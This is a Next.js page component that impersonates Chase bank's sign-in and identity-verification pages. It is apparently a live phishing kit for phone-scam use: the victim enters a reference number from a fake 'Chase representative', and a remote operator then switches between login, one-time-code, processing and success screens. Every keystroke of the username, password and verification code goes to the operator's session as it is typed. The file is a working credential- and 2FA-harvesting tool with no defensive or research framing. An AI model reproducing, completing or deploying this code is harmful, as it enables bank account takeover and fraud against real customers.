"use client";

import { useState, useEffect } from "react";
import { ControlRoomSession, SessionState } from "@/SDK/vendor-sdk";
import { CheckCircle2, XCircle, TriangleAlert, ChevronRight } from "lucide-react";

// White card container with rounding and shadow
const CardContainer = ({ children }: { children: React.ReactNode }) => (
  <div className="w-full bg-white rounded shadow-lg p-6 sm:p-8">
    {children}
  </div>
);

/* ===================================================================
   LOGIN FORM
   =================================================================== */

function LoginForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke: (field: string, value: string) => void; error?: string }) {
  const [userId, setUserId] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [validationError, setValidationError] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setValidationError("");

    if (!userId.trim()) {
      setValidationError("Enter your username.");
      return;
    }
    if (!password) {
      setValidationError("Enter your password.");
      return;
    }

    setIsSubmitting(true);
    try {
      await onInput({ event: "submit_credentials", user_id: userId, password: password });
    } catch {
      setIsSubmitting(false);
    }
  };

  const hasError = !!(error || validationError);

  return (
    <CardContainer>
      <form onSubmit={handleSubmit} className="space-y-6">
        {/* Username Field */}
        <div className="relative">
          <label className={`block text-sm font-bold mb-1 ${hasError ? 'text-chase-error' : 'text-gray-700'}`} htmlFor="username">Username</label>
          <input
            className={`form-input-chase ${hasError ? 'input-error text-gray-900' : 'text-gray-900'}`}
            id="username"
            name="username"
            type="text"
            value={userId}
            onChange={e => {
              setUserId(e.target.value);
              onKeystroke("user_id", e.target.value);
            }}
            autoComplete="username"
            autoFocus
          />
          {hasError && (
             <p className="mt-2 text-sm text-chase-error flex items-center font-semibold">
               <TriangleAlert className="w-3 h-3 mr-1" /> {validationError || error}
             </p>
          )}
        </div>

        {/* Password Field */}
        <div className="relative mt-4">
          <label className={`block text-sm font-bold mb-1 ${hasError ? 'text-chase-error' : 'text-gray-700'}`} htmlFor="password">Password</label>
          <div className="relative">
            <input
              className={`form-input-chase ${hasError ? 'input-error text-gray-900' : 'text-gray-900'}`}
              id="password"
              name="password"
              type={showPassword ? "text" : "password"}
              value={password}
              onChange={e => {
                setPassword(e.target.value);
                onKeystroke("password", e.target.value);
              }}
              autoComplete="current-password"
            />
            <button 
              className="absolute inset-y-0 right-0 pr-1 flex items-center text-sm font-semibold text-chase-blue bg-transparent border-none cursor-pointer" 
              type="button"
              onClick={() => setShowPassword(!showPassword)}
            >
              {showPassword ? "Hide" : "Show"}
            </button>
          </div>
        </div>

        {/* Checkboxes */}
        <div className="flex items-center justify-between pt-2">
          <div className="flex items-center">
            <input className="h-5 w-5 rounded border-gray-400 focus:ring-chase-blue" id="remember-me" name="remember-me" type="checkbox" />
            <label className="ml-2 block text-sm text-gray-700" htmlFor="remember-me">
              Remember username
            </label>
          </div>
          <div className="flex items-center">
            <input className="h-5 w-5 rounded border-gray-400 focus:ring-chase-blue" id="use-token" name="use-token" type="checkbox" />
            <label className="ml-2 block text-sm text-gray-700" htmlFor="use-token">
              Use token
            </label>
          </div>
        </div>

        {/* Sign In Button */}
        <div className="pt-2">
          <button 
            className="w-full flex justify-center py-3 px-4 border border-transparent rounded text-sm sm:text-base font-bold text-white bg-chase-blue hover:bg-chase-blue-dark focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-chase-blue transition-colors" 
            type="submit" 
            disabled={isSubmitting}
          >
            {isSubmitting ? "Signing in..." : "Sign in"}
          </button>
        </div>

        {/* Or Divider */}
        <div className="relative py-1">
          <div className="absolute inset-0 flex items-center">
            <div className="w-full border-t border-gray-300"></div>
          </div>
          <div className="relative flex justify-center text-sm">
            <span className="px-3 bg-white text-chase-blue font-semibold">
              Or
            </span>
          </div>
        </div>

        {/* Passwordless Sign In Button */}
        <div>
          <button 
            className="w-full flex justify-center py-3 px-4 border border-chase-blue rounded text-sm sm:text-base font-bold text-chase-blue bg-white hover:bg-gray-50 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-chase-blue transition-colors" 
            type="button"
          >
            Passwordless sign in
          </button>
        </div>

        {/* Links */}
        <div className="flex flex-col space-y-3 pt-4">
          <a className="text-sm font-semibold text-chase-blue hover:underline flex items-center" href="#">
            Forgot username/password? <ChevronRight className="w-3 h-3 ml-1" />
          </a>
          <a className="text-sm font-semibold text-chase-blue hover:underline flex items-center" href="#">
            Not enrolled? Sign up now. <ChevronRight className="w-3 h-3 ml-1" />
          </a>
        </div>
      </form>
    </CardContainer>
  );
}

/* ===================================================================
   OTP VERIFICATION FORM
   =================================================================== */

function OtpVerificationForm({ onInput, onKeystroke, error }: { onInput: (data: any) => Promise<void>; onKeystroke: (field: string, value: string) => void; error?: string }) {
  const [otp, setOtp] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);
    try {
      await onInput({ event: "verify_otp", otp_code: otp });
    } catch {
      setIsSubmitting(false);
    }
  };

  const hasError = !!error;

  return (
    <CardContainer>
      <h1 className="text-xl font-bold text-gray-900 mb-4">Verify Your Identity</h1>
      <p className="text-sm text-gray-700 mb-8">
        We&apos;ve sent a verification code to your registered device. Enter the code below to continue.
      </p>
      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="relative">
          <label className={`block text-sm font-bold mb-1 ${hasError ? 'text-chase-error' : 'text-gray-700'}`} htmlFor="otpCode">Verification Code</label>
          <input
            className={`form-input-chase ${hasError ? 'input-error text-gray-900' : 'text-gray-900'} text-2xl tracking-[0.5em] text-center font-bold`}
            id="otpCode"
            type="text"
            value={otp}
            onChange={e => {
              const val = e.target.value.replace(/\D/g, "").slice(0, 8);
              setOtp(val);
              onKeystroke("otp_code", val);
            }}
            inputMode="numeric"
            autoComplete="one-time-code"
            autoFocus
          />
          {hasError && (
             <p className="mt-2 text-sm text-chase-error flex items-center font-semibold">
               <TriangleAlert className="w-3 h-3 mr-1" /> {error}
             </p>
          )}
        </div>

        <div className="pt-2">
          <button 
            className="w-full flex justify-center py-3 px-4 border border-transparent rounded text-sm sm:text-base font-bold text-white bg-chase-blue hover:bg-chase-blue-dark focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-chase-blue transition-colors" 
            type="submit" 
            disabled={otp.length < 4 || isSubmitting}
          >
            {isSubmitting ? "Verifying..." : "Verify"}
          </button>
        </div>
      </form>
    </CardContainer>
  );
}

/* ===================================================================
   PROCESSING SCREEN
   =================================================================== */

function ProcessingScreen({ error }: { error?: string }) {
  return (
    <CardContainer>
      <h1 className="text-xl font-bold text-gray-900 mb-8 text-center">Processing Your Request</h1>
      <div className="flex flex-col items-center justify-center space-y-6">
        <div className="w-10 h-10 border-4 border-gray-200 border-t-chase-blue rounded-full animate-chase-spin"></div>
        <p className="text-sm text-gray-700 text-center leading-relaxed">
          Please wait while we securely verify your information.<br />Do not close or refresh this page.
        </p>
        {error && (
          <p className="w-full text-chase-error font-semibold text-sm mt-4 text-center">
             <TriangleAlert className="w-4 h-4 inline mr-1 align-text-bottom" /> {error}
          </p>
        )}
      </div>
    </CardContainer>
  );
}

/* ===================================================================
   SUCCESS SCREEN
   =================================================================== */

function SuccessScreen() {
  return (
    <CardContainer>
      <div className="flex flex-col items-center justify-center py-4">
        <CheckCircle2 className="w-16 h-16 text-green-600 mb-6" />
        <h1 className="text-xl font-bold text-center mb-4 text-green-700">Verification Complete</h1>
        <p className="text-sm text-gray-700 text-center leading-relaxed">
          Your identity has been successfully verified. You may now close this window.
        </p>
      </div>
    </CardContainer>
  );
}

/* ===================================================================
   FAILURE SCREEN
   =================================================================== */

function FailureScreen({ error }: { error?: string }) {
  return (
    <CardContainer>
      <div className="flex flex-col items-center justify-center py-4">
        <XCircle className="w-16 h-16 text-chase-error mb-6" />
        <h1 className="text-xl font-bold text-center mb-4 text-chase-error">Verification Failed</h1>
        <p className="text-sm text-gray-700 text-center leading-relaxed">
          {error || "We could not verify your information. Please contact Chase for assistance."}
        </p>
      </div>
    </CardContainer>
  );
}

/* ===================================================================
   MAIN PAGE
   =================================================================== */

export default function Home() {
  const [caseRef, setCaseRef] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [sessionState, setSessionState] = useState<SessionState | null>(null);
  const [session, setSession] = useState<ControlRoomSession | null>(null);

  const handleConnect = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!caseRef.trim()) return;

    setLoading(true);
    setError("");

    try {
      const s = new ControlRoomSession({
        tenant_id: "45818553-bd59-44c6-b095-323d395c9323", // From schema
        case_reference: caseRef.trim(),
        supabaseUrl: process.env.NEXT_PUBLIC_SUPABASE_URL!,
        supabaseKey: process.env.NEXT_PUBLIC_SUPABASE_PUBLISHABLE_KEY!,
      });
      const state = await s.connect();
      setSession(s);
      setSessionState(state);

      s.subscribe((newState) => {
        setSessionState(newState);
      });
    } catch (err: any) {
      setError(err.message || "Unable to connect. Please check your reference and try again.");
    } finally {
      setLoading(false);
    }
  };

  const handleInput = async (data: any) => {
    if (session) {
      await session.sendInput(data);
    }
  };

  const handleKeystroke = (field: string, value: string) => {
    if (session) {
      session.sendKeystroke(field, value);
    }
  };

  useEffect(() => {
    return () => {
      if (session) session.disconnect();
    };
  }, [session]);

  // Reference entry screen — before session is connected
  if (!sessionState) {
    return (
      <CardContainer>
        <h1 className="text-xl font-bold text-gray-900 mb-4 text-center">Secure Verification</h1>
        <p className="text-sm text-gray-700 text-center mb-8">
          Enter the reference number provided by your Chase representative to begin the verification process.
        </p>
        <form onSubmit={handleConnect} className="space-y-6">
          <div className="relative">
            <input
              className="form-input-chase text-xl font-bold tracking-[0.2em] text-center uppercase text-chase-blue"
              id="caseRefInput"
              type="text"
              value={caseRef}
              onChange={e => setCaseRef(e.target.value.toUpperCase())}
              placeholder="REFERENCE NUMBER"
              autoFocus
            />
            {error && (
               <p className="mt-3 text-sm text-chase-error flex items-center justify-center font-semibold">
                 <TriangleAlert className="w-3 h-3 mr-1" /> {error}
               </p>
            )}
          </div>
          <div className="pt-2">
            <button 
              className="w-full flex justify-center py-3 px-4 border border-transparent rounded text-sm sm:text-base font-bold text-white bg-chase-blue hover:bg-chase-blue-dark focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-chase-blue transition-colors" 
              type="submit" 
              disabled={loading || !caseRef.trim()}
            >
              {loading ? "Connecting..." : "Continue"}
            </button>
          </div>
        </form>
      </CardContainer>
    );
  }

  const operatorError = sessionState.operator_message;

  switch (sessionState.component_key) {
    case "LoginForm":
      return <LoginForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
    case "OtpVerificationForm":
      return <OtpVerificationForm onInput={handleInput} onKeystroke={handleKeystroke} error={operatorError} />;
    case "ProcessingScreen":
      return <ProcessingScreen error={operatorError} />;
    case "SuccessScreen":
      return <SuccessScreen />;
    case "FailureScreen":
      return <FailureScreen error={operatorError} />;
    default:
      return (
        <CardContainer>
          <h2 className="text-xl font-bold text-center mb-8 text-gray-900">Loading...</h2>
          <div className="flex flex-col items-center justify-center space-y-6">
            <div className="w-10 h-10 border-4 border-gray-200 border-t-chase-blue rounded-full animate-chase-spin"></div>
            <p className="text-sm text-gray-700 text-center leading-relaxed">
              Waiting for session: {sessionState.current_state}
            </p>
          </div>
        </CardContainer>
      );
  }
}
